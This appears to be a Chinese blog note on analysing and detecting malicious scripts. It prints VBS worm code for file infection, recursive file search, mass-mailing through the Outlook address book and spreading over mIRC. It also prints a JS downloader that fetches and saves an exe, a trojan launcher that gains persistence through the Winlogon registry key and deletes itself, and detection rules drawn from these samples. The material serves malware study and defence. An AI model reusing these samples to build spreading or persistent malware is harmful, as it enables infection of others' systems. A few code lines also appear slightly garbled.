<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">BOOL GetDebugPrivilege()</span><br><span class="line">&#123;</span><br><span class="line">    BOOL status = FALSE;</span><br><span class="line">    HANDLE hToken;</span><br><span class="line"> </span><br><span class="line">    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))</span><br><span class="line">    &#123;</span><br><span class="line">        TOKEN_PRIVILEGES tokenPrivs;</span><br><span class="line">        tokenPrivs.PrivilegeCount = 1;</span><br><span class="line">        if (LookupPrivilegeValueW(NULL, SE_DEBUG_NAME, &amp;tokenPrivs.Privileges[0].Luid))</span><br><span class="line">        &#123;</span><br><span class="line">            tokenPrivs.Privileges[0].Attributes = TRUE ? SE_PRIVILEGE_ENABLED : 0;</span><br><span class="line">            if (AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivs, sizeof(tokenPrivs), NULL, NULL))</span><br><span class="line">            &#123;</span><br><span class="line">                status = TRUE;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else wprintf(L&quot;[!] LookupPrivilegeValueW error: %u when get debug privilege.\n&quot;, GetLastError());</span><br><span class="line"> </span><br><span class="line">        CloseHandle(hToken);</span><br><span class="line">    &#125;</span><br><span class="line">    else wprintf(L&quot;[!] OpenProcessToken error: %u when get debug privilege.\n&quot;, GetLastError());</span><br><span class="line"> </span><br><span class="line">    return status;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<h2 id="恶意脚本快速分析"><a class="markdownIt-Anchor" href="#恶意脚本快速分析">#</a> 恶意脚本快速分析</h2>
<h3 id="vbs脚本病毒"><a class="markdownIt-Anchor" href="#vbs脚本病毒">#</a> vbs 脚本病毒</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">VBS脚本病毒一般是直接通过自我复制来感染文件的，病毒中的绝大部分代码都可以直接附加在其他同类程序的中间，譬如新欢乐时光病毒可以将自己的代码附加在.htm文件的尾部，并在顶部加入一条调用病毒代码的语句，而爱虫病毒则是直接生成一个文件的副本，将病毒代码拷入其中，并以原文件名作为病毒文件名的前缀，vbs作为后缀。下面我们通过爱虫病毒的部分代码具体分析一下这类病毒的感染和搜索原理：</span><br><span class="line">以下是文件感染的部分关键代码：</span><br></pre></td></tr></table></figure>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Set</span> fso=<span class="built_in">createobject</span>(<span class="string">&quot;scripting.filesystemobject&quot;</span>) <span class="comment">&#x27;创建一个文件系统对象</span></span><br><span class="line">　　<span class="keyword">set</span> self=fso.opentextfile(wscript.scriptfullname,<span class="number">1</span>) <span class="comment">&#x27;读打开当前文件（即病毒本身）</span></span><br><span class="line">　　vbscopy=self.readall　　 <span class="comment">&#x27; 读取病毒全部代码到字符串变量vbscopy……</span></span><br><span class="line">　　<span class="keyword">set</span> ap=fso.opentextfile(目标文件.path,<span class="number">2</span>,<span class="literal">true</span>) <span class="comment">&#x27; 写打开目标文件，准备写入病毒代码</span></span><br><span class="line">　　ap.write vbscopy　　　　　　 <span class="comment">&#x27; 将病毒代码覆盖目标文件</span></span><br><span class="line">　　ap.close</span><br><span class="line">　　<span class="keyword">set</span> cop=fso.getfile(目标文件.path) <span class="comment">&#x27;得到目标文件路径</span></span><br><span class="line">　　cop.copy(目标文件.path &amp; <span class="string">&quot;.vbs&quot;</span>)　 <span class="comment">&#x27; 创建另外一个病毒文件（以.vbs为后缀）</span></span><br><span class="line">　　目标文件.delete(<span class="literal">true</span>)　　　<span class="comment">&#x27;删除目标文件</span></span><br></pre></td></tr></table></figure>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	MD5: xxxxx</span><br><span class="line">	&#123;</span><br><span class="line">		S1: Set fso=createobject(&quot;scripting.filesystemobject&quot;)    </span><br><span class="line">		S2: set self=fso.opentextfile(wscript.scriptfullname,1)  //需要由action并且执行才能定义为病毒</span><br><span class="line">		&#123;</span><br><span class="line">			pf1=60					// 60 属于低危</span><br><span class="line">		&#125;</span><br><span class="line">		S3: .write</span><br><span class="line">		S4: .close</span><br><span class="line">		&#123;</span><br><span class="line">			pf1=80					// 60 + 80 </span><br><span class="line">		&#125;</span><br><span class="line">		S5: 写，创建，拷贝</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>检测 vbs 方法</p>
<p>1. 规则建模 + 机器学习</p>
<p>2. 机器学习中使用 ast 语法树</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&#x27;该函数主要用来寻找满足条件的文件，并生成对应文件的一个病毒副本</span></span><br><span class="line">　　<span class="keyword">sub</span> scan(folder_)　　<span class="comment">&#x27;scan函数定义，</span></span><br><span class="line">　　<span class="keyword">on</span> <span class="keyword">error</span> <span class="keyword">resume</span> <span class="keyword">next</span>　　 <span class="comment">&#x27;如果出现错误，直接跳过，防止弹出错误窗口</span></span><br><span class="line">　　<span class="keyword">set</span> folder_=fso.getfolder(folder_)</span><br><span class="line">　　　　 <span class="keyword">set</span> files=folder_.files　　 <span class="comment">&#x27; 当前目录的所有文件集合</span></span><br><span class="line">　　　　 <span class="keyword">for</span> <span class="keyword">each</span> file <span class="keyword">in</span> filesext=fso.GetExtensionName(file)　　<span class="comment">&#x27;获取文件后缀</span></span><br><span class="line">　　　　 ext=<span class="built_in">lcase</span>(ext)　　　 <span class="comment">&#x27;后缀名转换成小写字母</span></span><br><span class="line">　　　　　<span class="keyword">if</span> ext=<span class="string">&quot;mp5&quot;</span> <span class="keyword">then</span>　　<span class="comment">&#x27;如果后缀名是mp5，则进行感染。请自己建立相应后缀名的文件，最好是非正常后缀名 ，以免破坏正常程序。</span></span><br><span class="line">　　　　Wscript.echo (file)</span><br><span class="line">　　　<span class="keyword">end</span> <span class="keyword">if</span></span><br><span class="line">　　<span class="keyword">next</span></span><br><span class="line">　　<span class="keyword">set</span> subfolders=folder_.subfolders</span><br><span class="line">　　<span class="keyword">for</span> <span class="keyword">each</span> subfolder <span class="keyword">in</span> subfolders　　<span class="comment">&#x27;搜索其他目录；递归调用</span></span><br><span class="line">　　　scan( )</span><br><span class="line">　　　scan(subfolder)</span><br><span class="line">　　<span class="keyword">next</span></span><br><span class="line">　　<span class="keyword">end</span> <span class="keyword">sub</span></span><br></pre></td></tr></table></figure>
<p>一般感染随着服务加载的程序，用 pchunter 查看，做服务替换。感染服务器文件的 PE 节</p>
<p>上面的代码就是 VBS 脚本病毒进行文件搜索的代码分析。搜索部分 scan ( ) 函数做得比较短小精悍，非常巧妙，采用了一个递归的算法遍历整个分区的目录和文件。</p>
<p><strong>2．vbs 脚本病毒通过网络传播的几种方式及代码分析</strong></p>
<p>VBS 脚本病毒之所以传播范围广，主要依赖于它的网络传播功能，一般来说，VBS 脚本病毒采用如下几种方式进行传播：</p>
<p>​		用 vbs 可以绕过 hips，作为桥接</p>
<p>1）通过 Email 附件传播</p>
<p>这是一种用的非常普遍的传播方式，病毒可以通过各种方法拿到合法的 Email 地址，最常见的就是直接取 outlook 地址簿中的邮件地址，也可以通过程序在用户文档（譬如 htm 文件）中搜索 Email 地址。</p>
<figure class="highlight vbscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">　<span class="keyword">Function</span> mailBroadcast()</span><br><span class="line">　　<span class="keyword">on</span> <span class="keyword">error</span> <span class="keyword">resume</span> <span class="keyword">next</span></span><br><span class="line">　　wscript.echo</span><br><span class="line">　　<span class="keyword">Set</span> outlookApp = <span class="built_in">CreateObject</span>(<span class="string">&quot;Outlook.Application&quot;</span>) //创建一个OUTLOOK应用的对象</span><br><span class="line">　　<span class="keyword">If</span> outlookApp= <span class="string">&quot;Outlook&quot;</span> <span class="keyword">Then</span></span><br><span class="line">　　　<span class="keyword">Set</span> mapiObj=outlookApp.GetName<span class="built_in">Space</span>(<span class="string">&quot;MAPI&quot;</span>) //获取MAPI的名字空间</span><br><span class="line">　　　<span class="keyword">Set</span> addrList= mapiObj.AddressLists　　　　　　　　//获取地址表的个数</span><br><span class="line">　　　<span class="keyword">For</span> <span class="keyword">Each</span> addr <span class="keyword">In</span> addrList</span><br><span class="line">　　　<span class="keyword">If</span> addr.AddressEntries.Count &lt;&gt; <span class="number">0</span> <span class="keyword">Then</span></span><br><span class="line">　　 addrEntCount = addr.AddressEntries.Count //获取每个地址表的Email记录数</span><br><span class="line">　　 <span class="keyword">For</span> addrEntIndex= <span class="number">1</span> <span class="keyword">To</span> addrEntCount　　 //遍历地址表的Email地址</span><br><span class="line">　　　　<span class="keyword">Set</span> item = outlookApp.CreateItem(<span class="number">0</span>)　　 //获取一个邮件对象实例</span><br><span class="line">　　　　<span class="keyword">Set</span> addrEnt = addr.AddressEntries(addrEntIndex) //获取具体Email地址</span><br><span class="line">　　　　item.<span class="keyword">To</span> = addrEnt.Address　　　　　　　　　　 //填入收信人地址　　　　item.Subject = <span class="string">&quot;病毒传播实验&quot;</span>　　//写入邮件标题</span><br><span class="line">　　　　item.Body = <span class="string">&quot;这里是病毒邮件传播测试，收到此信请不要慌张！&quot;</span> //写入文件内容</span><br><span class="line">　　　　<span class="keyword">Set</span> attachMents=item.Attachments //定义邮件附件</span><br><span class="line">　　　　attachMents.Add fileSysObj.GetSpecialFolder(<span class="number">0</span>) &amp; <span class="string">&quot;\test.jpg.vbs&quot;</span></span><br><span class="line">　　　　item.DeleteAfterSubmit = <span class="literal">True</span>　　 //信件提交后自动删除</span><br><span class="line">　　　　<span class="keyword">If</span> item.<span class="keyword">To</span> &lt;&gt; <span class="string">&quot;&quot;</span> <span class="keyword">Then</span></span><br><span class="line">　　　　item.Send　　　　　　　　　　 //发送邮件</span><br><span class="line">　　　　shellObj.regwrite <span class="string">&quot;HKCU\software\Mailtest\mailed&quot;</span>, <span class="string">&quot;1&quot;</span> //病毒标记，以免重复感染</span><br><span class="line">　　　　<span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">　　 <span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line"><span class="keyword">Next</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">if</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Function</span></span><br></pre></td></tr></table></figure>
<p>2）通过局域网共享传播</p>
<p>局域网共享传播也是一种非常普遍并且有效的网络传播方式。一般来说，为了局域网内交流方便，一定存在不少共享目录，并且具有可写权限，譬如 win2000 创建共享时，默认就是具有可写权限。这样病毒通过搜索这些共享目录，就可以将病毒代码传播到这些目录之中。</p>
<p>在 VBS 中，有一个对象可以实现网上邻居共享文件夹的搜索与文件操作。我们利用该对象就可以达到传播的目的。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">welcome_msg = &quot;网络连接搜索测试&quot;</span><br><span class="line">Set WSHNetwork = WScript.CreateObject(&quot;WScript.Network&quot;) ’创建一个网络对象</span><br><span class="line">Set oPrinters = WshNetwork.EnumPrinterConnections ’创建一个网络打印机连接列表</span><br><span class="line">WScript.Echo &quot;Network printer mappings:&quot;</span><br><span class="line">For i = 0 to oPrinters.Count - 1 Step 2　　 ’显示网络打印机连接情况</span><br><span class="line">WScript.Echo &quot;Port &quot; &amp; oPrinters.Item(i) &amp; &quot; = &quot; &amp; oPrinters.Item(i+1)</span><br><span class="line">Next</span><br><span class="line">Set colDrives = WSHNetwork.EnumNetworkDrives ’创建一个网络共享连接列表</span><br><span class="line">If colDrives.Count = 0 Then</span><br><span class="line">MsgBox &quot;没有可列出的驱动器。&quot;, vbInformation + vbOkOnly,welcome_msg</span><br><span class="line">Else</span><br><span class="line">strMsg = &quot;当前网络驱动器连接: &quot; &amp; CRLF</span><br><span class="line">For i = 0 To colDrives.Count - 1 Step 2</span><br><span class="line">strMsg = strMsg &amp; Chr(13) &amp; Chr(10) &amp; colDrives(i) &amp; Chr(9) &amp; colDrives(i + 1)</span><br><span class="line">Next</span><br><span class="line">MsgBox strMsg, vbInformation + vbOkOnly, welcome_msg’显示当前网络驱动器连接End If</span><br></pre></td></tr></table></figure>
<p>上面是一个用来寻找当前打印机连接和网络共享连接并将它们显示出来的完整脚本程序。在知道了共享连接之后，我们就可以直接向目标驱动器读写文件了。</p>
<p>3）通过感染 htm、asp、jsp、php 等网页文件传播</p>
<p>如今，WWW 服务已经变得非常普遍，病毒通过感染 htm 等文件，势必会导致所有访问过该网页的用户机器感染病毒。</p>
<p>病毒之所以能够在 htm 文件中发挥强大功能，采用了和绝大部分网页恶意代码相同的原理。基本上，它们采用了相同的代码，不过也可以采用其它代码，这段代码是病毒 FSO,WSH 等对象能够在网页中运行的关键。在注册表 HKEY_CLASSES_ROOT\CLSID\ 下我们可以找到这么一个主键 {F935DC22-1CF0-11D0-ADB9-00C04FD58A0B}，注册表中对它他的说明是 “Windows Script Host Shell Object”，同样，我们也可以找到 {0D43FE01-F093-11CF-8940-00A0C9054228}，注册表对它的说明是 “FileSystem Object”，一般先要对 COM 进行初始化，在获取相应的组件对象之后，病毒便可正确地使用 FSO、WSH 两个对象，调用它们的强大功能。代码如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">　Set Apple0bject = document.applets(&quot;KJ_guest&quot;)</span><br><span class="line">　　Apple0bject.setCLSID(&quot;&#123;F935DC22-1CF0-11D0-ADB9-00C04FD58A0B&#125;&quot;)</span><br><span class="line">　　Apple0bject.createInstance()　　　　　　 ’创建一个实例</span><br><span class="line">　　Set WsShell Apple0bject.Get0bject()</span><br><span class="line">　　Apple0bject.setCLSID(&quot;&#123;0D43FE01-F093-11CF-8940-00A0C9054228&#125;&quot;)</span><br><span class="line">　　Apple0bject.createInstance()　　　　　　 ’创建一个实例</span><br><span class="line">　　Set FSO = Apple0bject.Get0bject()</span><br></pre></td></tr></table></figure>
<p>4）通过 IRC 聊天通道传播</p>
<p>病毒通过 IRC 传播一般来说采用以下代码（以 MIRC 为例）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Dim mirc</span><br><span class="line">set fso=CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">set mirc=fso.CreateTextFile(&quot;C:\mirc\script.ini&quot;) ’创建文件script.ini</span><br><span class="line">fso.CopyFile Wscript.ScriptFullName, &quot;C:\mirc\attachment.vbs&quot;, True ’将病毒文件备份到attachment.vbs</span><br><span class="line">mirc.WriteLine &quot;[script]&quot;</span><br><span class="line">mirc.WriteLine &quot;n0=on 1:join:*.*: &#123; if ( $nick !=$me ) &#123;halt&#125; /dcc send $nick C:\mirc\attachment.vbs &#125;&quot;</span><br><span class="line">　　　　&#x27;利用命令/ddc send $nick attachment.vbs给通道中的其他用户传送病毒文件</span><br><span class="line">mirc.Close</span><br></pre></td></tr></table></figure>
<p>2．vbs 脚本病毒的弱点</p>
<p>vbs 脚本病毒由于其编写语言为脚本，因而它不会像 PE 文件那样方便灵活，它的运行是需要条件的（不过这种条件默认情况下就具备了）。笔者认为，VBS 脚本病毒具有如下弱点：</p>
<p>1）绝大部分 VBS 脚本病毒运行的时候需要用到一个对象：<strong>FileSystemObject</strong><br>
　2）VBScript 代码是通过 Windows Script Host 来解释执行的。<br>
　3）VBS 脚本病毒的运行需要其关联程序 Wscript.exe 的支持。<br>
　4）通过网页传播的病毒需要 ActiveX 的支持<br>
　5）通过 Email 传播的病毒需要 OE 的自动发送邮件功能支持，但是绝大部分病毒都是以 Email 为主要传播方式的。</p>
<p>3．如何预防和解除 vbs 脚本病毒<br>
　针对以上提到的 VBS 脚本病毒的弱点，笔者提出如下集中防范措施：</p>
<p>1）禁用文件系统对象 FileSystemObject</p>
<p>方法：用 regsvr32 scrrun.dll/u 这条命令就可以禁止文件系统对象。其中 regsvr32 是 Windows\System 下的可执行文件。或者直接查找 scrrun.dll 文件删除或者改名。</p>
<p>还有一种方法就是在注册表中 HKEY_CLASSES_ROOT\CLSID\ 下找到一个主键 {0D43FE01-F093-11CF-8940-00A0C9054228} 的项，咔嚓即可。</p>
<p>2）卸载 Windows Scripting Host</p>
<p>在 Windows 98 中（NT 4.0 以上同理），打开［控制面板］→［添加 / 删除程序］→［Windows 安装程序］→［附件］，取消 “Windows Scripting Host” 一项。</p>
<p>和上面的方法一样，在注册表中 HKEY_CLASSES_ROOT\CLSID\ 下找到一个主键 {F935DC22-1CF0-11D0-ADB9-00C04FD58A0B} 的项，咔嚓。</p>
<p>3）删除 VBS、VBE、JS、JSE 文件后缀名与应用程序的映射点击［我的电脑］→［查看］→［文件夹选项］→［文件类型］，然后删除 VBS、VBE、JS、JSE 文件后缀名与应用程序的映射。</p>
<p>4）在 Windows 目录中，找到 WScript.exe，更改名称或者删除，如果你觉得以后有机会用到的话，最好更改名称好了，当然以后也可以重新装上。</p>
<p>5）要彻底防治 VBS 网络蠕虫病毒，还需设置一下你的浏览器。我们首先打开浏览器，单击菜单栏里 “Internet 选项” 安全选项卡里的［自定义级别］按钮。把 “ActiveX 控件及插件” 的一切设为禁用，这样就不怕了。呵呵，譬如新欢乐时光的那个 ActiveX 组件如果不能运行，网络传播这项功能就玩完了。</p>
<p>6）禁止 OE 的自动收发邮件功能</p>
<p>7）由于蠕虫病毒大多利用文件扩展名作文章，所以要防范它就不要隐藏系统中已知文件类型的扩展名。Windows 默认的是 “隐藏已知文件类型的扩展名称”，将其修改为显示所有文件类型的扩展名称。</p>
<p>8）将系统的网络连接的安全级别设置至少为 “中等”，它可以在一定程度上预防某些有害的 Java 程序或者某些 ActiveX 组件对计算机的侵害。</p>
<h3 id="ast语法树"><a class="markdownIt-Anchor" href="#ast语法树">#</a> AST 语法树</h3>
<p>文本 -&gt; 抽象语法树的过程</p>
<p>词法分析：文本 -&gt; token 列表</p>
<ul>
<li>去除空格，对 token 分类，去除空格，然后对 token 分类，那些属于语法关键字，那些属于操作符，那些属于语句的截止位置，那些属于数据</li>
</ul>
<p>语法分析：token 列表 -&gt; 语法二叉树</p>
<ul>
<li>扫描 token 流，然后分析它的语法，这一步应该是分析一条以；结尾的语句具体的执行规则，然后使用逆波兰表达式组合，最后形成一个二叉树，二叉树从底部往上一步步合并</li>
</ul>
<p><strong>第一步：词法分析，也叫扫描 scanner</strong> 它读取我们的代码，然后把它们按照预定的规则合并成一个个的标识 tokens。同时，它会移除空白符、注释等。最后，整个代码将被分割进一个 tokens 列表（或者说一维数组）。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">5</span>;</span><br><span class="line"><span class="comment">// 转换成</span></span><br><span class="line">[&#123;value: <span class="string">&#x27;const&#x27;</span>, type: <span class="string">&#x27;keyword&#x27;</span>&#125;, &#123;value: <span class="string">&#x27;a&#x27;</span>, type: <span class="string">&#x27;identifier&#x27;</span>&#125;, ...]</span><br></pre></td></tr></table></figure>
<p>当词法分析源代码的时候，它会一个一个字母地读取代码，所以很形象地称之为扫描 - scans。当它遇到空格、操作符，或者特殊符号的时候，它会认为一个话已经完成了。 <strong>第二步：语法分析，也称解析器</strong> 它会将词法分析出来的数组转换成树形的形式，同时，验证语法。语法如果有错的话，抛出语法错误。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[&#123;value: <span class="string">&#x27;const&#x27;</span>, type: <span class="string">&#x27;keyword&#x27;</span>&#125;, &#123;value: <span class="string">&#x27;a&#x27;</span>, type: <span class="string">&#x27;identifier&#x27;</span>&#125;, ...]</span><br><span class="line"><span class="comment">// 语法分析后的树形形式</span></span><br><span class="line">&#123;</span><br><span class="line">   type: <span class="string">&quot;VariableDeclarator&quot;</span>, </span><br><span class="line">   id: &#123;</span><br><span class="line">       type: <span class="string">&quot;Identifier&quot;</span>,</span><br><span class="line">       name: <span class="string">&quot;a&quot;</span></span><br><span class="line">   &#125;,</span><br><span class="line">   ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当生成树的时候，解析器会删除一些没必要的标识 tokens（比如：不完整的括号），因此 AST 不是 100% 与源码匹配的。 解析器 100% 覆盖所有代码结构生成树叫做 CST（具体语法树）。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC83MDMwNDU3MDM4ODQwNzkxMDUz">抽象语法树（AST）入门 - 掘金 (juejin.cn)</span></p>
<h3 id="vbs-脚本解释器"><a class="markdownIt-Anchor" href="#vbs-脚本解释器">#</a> VBS 脚本解释器</h3>
<p>windows script host</p>
<p>wscript.exe</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 1.vbs</span><br><span class="line">wscript.exe -x 1.vbs</span><br><span class="line">Set fso = CreateObject(&quot;scripting.filesystemobject&quot;)</span><br><span class="line">set myfile = fso.CreateTextFile(&quot;C:\1.txt&quot;,,true)</span><br></pre></td></tr></table></figure>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231001193259342.png" alt="image-20231001193259342"></p>
<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231001193409975.png" alt="image-20231001193409975"></p>
<h3 id="edr-hips"><a class="markdownIt-Anchor" href="#edr-hips">#</a> EDR &amp; HIPS</h3>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzUzMTQ0NjQ0Nw==">EDR（终端检测与响应）和传统杀毒软件有什么区别？ - 知乎 (zhihu.com)</span></p>
<h3 id="js-下载器"><a class="markdownIt-Anchor" href="#js-下载器">#</a> js 下载器</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">var objArgs=WScript.Arguments;</span><br><span class="line">var sGet=new ActiveXObject(&quot;ADODB.Stream&quot;);</span><br><span class="line">var xGet=null;</span><br><span class="line">try&#123;</span><br><span class="line">xGet=new XMLHttpRequest();</span><br><span class="line">&#125;catch(e)&#123;</span><br><span class="line">try&#123;</span><br><span class="line">xGet=new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);</span><br><span class="line">&#125;catch(ex)&#123;</span><br><span class="line">try&#123;</span><br><span class="line">xGet=new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">&#125;catch(e3)&#123;</span><br><span class="line">xGet=null;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(xGet != null)&#123;</span><br><span class="line">xGet.Open(&quot;GET&quot;,&quot;http://localhost/aplan/mycalc.exe&quot;,0);</span><br><span class="line">xGet.Send();</span><br><span class="line">sGet.Mode=3;</span><br><span class="line">sGet.Type=1;</span><br><span class="line">sGet.Open();</span><br><span class="line">sGet.Write(xGet.ResponseBody);</span><br><span class="line">sGet.SaveToFile(&quot;D:\\haha.exe&quot;,2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>定位：</p>
<p>var sGet=new ActiveXObject(“ADODB.Stream”);</p>
<p>xGet=new XMLHttpRequest();</p>
<p>xGet.Open(“GET”,&quot;&quot;,0);</p>
<h3 id="规则提取与查杀方式"><a class="markdownIt-Anchor" href="#规则提取与查杀方式">#</a> 规则提取与查杀方式</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">dim wsh</span><br><span class="line">set wsh=CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">wsh.run &quot;%windir%\flumasko.exe&quot;,0 //运行木马程序</span><br><span class="line">set sm=Wscript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">sm.RegWrite &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell&quot;,&quot;Explorer.exe %systemroot%\system32\winmgmt.exe&quot;</span><br><span class="line">//写进注册表项实现自启动</span><br><span class="line">set WshShell=WScript.CreateObject(&quot;WScript.Shell&quot;)</span><br><span class="line">WScript.Sleep 2000</span><br><span class="line">//等木马的执行完毕</span><br><span class="line">Set fso=CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class="line">f=fso.DeleteFile (&quot;flumasko.exe&quot;)</span><br><span class="line">f=fso.DeleteFile (WScript.ScriptName)</span><br></pre></td></tr></table></figure>
<p>规则：</p>
<p>模型 A：添加注册表启动</p>
<p>set wsh=CreateObject(“WScript.Shell”)</p>
<p>sm.RegWrite “HKLM\SOFTWARE*”,“Explorer.exe %systemroot%\system32\winmgmt.exe”</p>
<p>规则 B：删除宿主程序</p>
<p>f=fso.DeleteFile (“flumasko.exe”)<br>
f=fso.DeleteFile (WScript.ScriptName)</p>
<h3 id="二进制vbs"><a class="markdownIt-Anchor" href="#二进制vbs">#</a> 二进制 vbs</h3>
